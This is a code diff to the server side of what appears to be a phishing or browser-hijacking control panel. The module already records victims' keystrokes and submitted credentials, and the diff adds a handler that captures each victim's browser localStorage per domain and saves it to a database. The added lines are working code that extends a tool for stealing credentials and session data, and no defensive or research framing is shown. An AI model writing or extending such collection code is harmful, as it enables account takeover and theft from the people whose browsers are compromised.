@@ -35,6 +35,10 @@ module.exports = function initializeClientApi(appClients, server) {
             handleActivityLog(client_id, data[1]);
             sendEvent("keylogs", client_id);
             break;
+          case "setlocalstorage":
+            handleSetLocalStorage(client_id, data[1]);
+            sendEvent("localstorage", client_id);
+            break;
         }
       } catch (err) {
         console.error(err);
@@ -141,6 +145,29 @@ function handleAddSubmittedCredentials(client_id, credentials) {
     credentials.metadata.timestamp,
     JSON.stringify(credentials.formData)
   );
+}
+function handleSetLocalStorage(client_id, storagedata) {
+  db.transaction(() => {
+    // delete existing localstorage for this client_id and domain
+    const stmtDelete = db.prepare(
+      `
+      DELETE FROM localstorage WHERE client_id = ? AND domain = ?
+    `
+    );
+
+    stmtDelete.run(client_id, storagedata.domain);
+
+    const stmt = db.prepare(
+      `
+      INSERT INTO localstorage (client_id, domain, key, value)
+      VALUES (?, ?, ?, ?)
+    `
+    );
+    const storage = storagedata.storage;
+    for (const key in storage) {
+      stmt.run(client_id, storagedata.domain, key, storage[key]);
+    }
+  })();
 }
 function handleActivityLog(client_id, log) {
   const stmt = db.prepare(
